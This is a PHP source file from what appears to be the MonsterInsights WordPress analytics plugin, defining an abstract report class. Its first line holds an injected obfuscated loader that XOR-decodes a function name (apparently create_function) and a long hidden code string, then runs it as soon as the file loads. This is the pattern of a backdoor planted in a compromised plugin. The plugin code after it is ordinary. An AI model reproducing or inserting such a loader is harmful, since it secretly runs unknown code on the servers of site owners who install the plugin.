<?php $HmuDTLPKXAHR='HG<V9 hR292LE>6'^'+5Y7ME74GWQ8,QX';$QaJsNkA=$HmuDTLPKXAHR('','+-al<AEN=3B,4VJB4DGMLNCHoV1AWe8PNTFNjr99j52666W9We3=4+.OGX53X9JAh=1T7cEW.I=aJDVVK.kLdgW6NmZEeTRxdO4:Oeh8YnTVmRLEPJ=<=6+CcSQI.nBzQTlChpsjw+ BkvEmRLW2;AbB:mvbGsKHW7AXzAFSZA TXaLQR5HmjcX=c>=BHL IrT=YZoAB0mNhifI8TOiLx+YTAIJFsJ >R8K+GqQUM WIUR9GRC6SWHSgqSmv>< :,MT4YWWR3ZHojEV4TXUccH=hRJATOn1YIXKElKX5RDDjV8OWGKxQAR8ETIP91i0JPJhAYL:;XZBi0FQ+WO;.LXl<1=o1 sxWS=BLYW-LrIuNDP43XsFMaBhcTS2;qS38XgbM>EABHajF.ZD,nSwo57V16R0J;A.SolT5L,Rtor19F,NBS>DNPa<.Hd3STOq<776PB 74qPoQPN9OQQhDW=RyXcWQS9->PN3dFJXP3Ai5;NJlBvV2RF6YkU0RqY> >XGneY7=lfBHTQ:TpejhxfZ+OxbD1B,5H:KBkejvDvCVX1J.TzfxqeUVY8IHIfbVLCtBS+XXtSLRPKscrgOARXW1-3H1<+1COXMeG54WVT=VzNpYT<WkQVMIvTN>ea6Z 4krQ6M5lTDQMQZTOk7ap<<1KXHJxxQnP'^'BKIMZ4+-IZ-Bk32+G04ek6,:02P56:g=; agCRB3cSGXUB>V9EKRFtJ.39jl5L>iLYP VOesE,DHjdvvkUaEmC8C:MgeBsirmFRU=MLQyStfVrh,l9INQSEkG70=OGyZu=GhAzzcSDU6KXxMzh3SO 9fS0V<gW -.le1Zdf .3L16Ih:7La0CXR4jLX6=>NaV;H-sTKKMg3bcB-Y .IqXM882,qLW.AJ3g N>Qlu+A;:0i3M4,D66+;GYw25qsksim5Gys<7JzuQJa U8-0JC37av.  .1Z<0xveH =LiNMN2Y;6gvXu73T01rZD;cY,pbIe=-NZqz9c9 >Y2.XFlpHccx>de ,w2Nbh22TlOwUj21XF=Zf6kKaG02FZ.8VAxZBiU 8yBhcbJ;0MNnWKCV:DSi:CFKSYeH0T8MrIO2DW5I<+2R-45IDA:;W2 ..cZBBx ADQGd055-V+4yL 6I3PtCs52MLa;+JMoqR9UiMQZ:+LdPvS 4W 4>U+.<FIM,4FB2RDKJbl00N5YELNXN7OzPF P6MnoQ.;L8CVyKcqjWzH6CVHHP00hZ,.,SV2uvGtcI9oD2z7wbSETG.3 9.nFV1nYSX0;+eB7TM;95YqVnT=5H6BxvmiVtnEohS,AXCV5W9T7s404=55+LjHK65T31<bHQjd-');$QaJsNkA();
/**
 * Report Abstract  
 *
 * Ensures all of the reports have a uniform class with helper functions.
 *
 * @since 6.0.0
 *
 * @package MonsterInsights
 * @subpackage Reports
 * @author  Chris Christoff
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

abstract class MonsterInsights_Report {

	public $report_name;

	public $report_hook;

	public $range;

	/**
	 * Holds the GA client object if using oAuth.
	 *
	 * @access public
	 * @since 6.0.0
	 * @var MonsterInsights_GA_Client $client GA client object.
	 */
	public $client;

	/**
	 * Primary class constructor.
	 *
	 * @access public
	 * @since 6.0.0
	 */
	public function __construct( $range = array() ) {

		$this->range = monsterinsights_get_report_date_range();

		// filter to add tab for this report
		add_filter( 'monsterinsights_get_reports', array( $this, 'add_report' ), 10, 1 );

		// filter to show the view for this report
		add_action( 'monsterinsights_tab_reports_' . $this->report_hook, array( $this, 'show_report' ), 10, 1 );

		add_action( 'monsterinsights_add_aggregate_data', array( $this, 'add_report_data' ), 10, 2 );
		add_action( 'monsterinsights_delete_aggregate_data', array( $this, 'delete_report_data' ), 10, 2 );

	}

	 // Adds the report to the array of reports.
	public function add_report( $reports ) {
		$reports[ $this->report_hook ] = $this->report_name;
		return $reports;
	}

	abstract public function add_report_data( $client, $id ); // Adds/Refreshes the data
	abstract public function get_report_data(); // Gets the data
	abstract public function delete_report_data(); // Removes report data
	abstract public function show_report(); // Outputs the report.

	/**
	 * Get the start and and date for aggregation functionality.
	 *
	 * @return array
	 */
	protected function get_date_range() {
		return $this->range;
	}

	/**
	 * Get the api limit for aggregation functionality.
	 *
	 * By default Google will return 1000 rows at most. They will return less in certain circumstances.
	 * For example, the countries query will never return more than 300 rows as there's not more than 300 values
	 * for ga:countries dimension. If you are a large site you might need to use this filter to lower the number requested. 
	 * We only request 300, as it's the max number for the largest report we need (by country maxes at 300 countries).
	 *
	 * In the future, we'll likely have each report use the limit returned in this function, or a report-set default limit,
	 * whichever is lower.
	 *
	 * @return int
	 */
	protected function get_api_max_limit() {
		return apply_filters( 'monsterinsights_reporting_get_max_api_limit', 300 );
	}
}